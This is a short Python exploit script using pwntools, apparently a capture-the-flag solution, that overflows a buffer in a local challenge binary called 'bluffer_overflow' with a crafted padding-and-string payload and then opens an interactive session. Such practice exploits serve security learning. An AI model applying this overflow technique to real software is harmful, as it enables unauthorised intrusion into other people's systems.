from pwn import *
context.binary = binary = ELF("./bluffer_overflow")

p = process()
# p = remote("0.0.0.0", 1234) # server location


payload = b"3\x00" + b"A" * (27 - len(b"3\x00")) + b"quack\x00"

p.sendline(payload)
p.interactive()

